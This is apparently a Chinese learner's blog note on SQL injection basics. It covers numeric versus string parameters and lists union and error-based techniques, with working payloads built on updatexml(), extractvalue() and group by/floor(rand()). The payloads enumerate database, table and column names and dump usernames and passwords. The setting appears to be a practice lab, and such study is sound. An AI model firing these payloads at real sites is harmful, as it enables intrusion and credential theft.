---
title: sql注入基本知识
date: 2023年4月24日19:46:51
tags: web
---

url中?表示传参，id表示变量，

参数类型

1. 数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。

如 www.text.com/text.php?id=3 对应的sql语句为 select * from table where id=3

2. 字符型：字符型注入正好相反

当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹

例如数字型语句：select * from table where id =3

则字符型如下：select * from table where name=’admin’



注入手法的话可以分为以下几类：

```
联合查询注入：union selest
报错注入：
		group by（重复键冲）
				?id=1' and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+
		 extractvalue() 函数
				?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+
		 updatexml() 函数
				获取数据库名字?id=1' and updatexml(1,concat('^',(database()),'^'),1) --+
				获取当前数据库中表的名字?id=1' and updatexml(1,concat('^',(select table_name from information_schema.tables where table_schema='security' ),'^'),1) --+
				爆表中的字段?id=1' and updatexml(1,concat('^',(select column_name from  information_schema.columns where table_name='users' and table_schema='security' limit 0,1 ),'^'),1) --+
				爆字段中的内容?id=1' and updatexml(1,concat('^',(select group_concat(username,"--",password) from users limit 0,1 ),'^'),1) --+
布尔盲注
时间盲注
多语句查询注入：
https://blog.csdn.net/qq_44159028/article/details/114325805
```

布尔盲注和时间盲注直接用sqlmap注入吧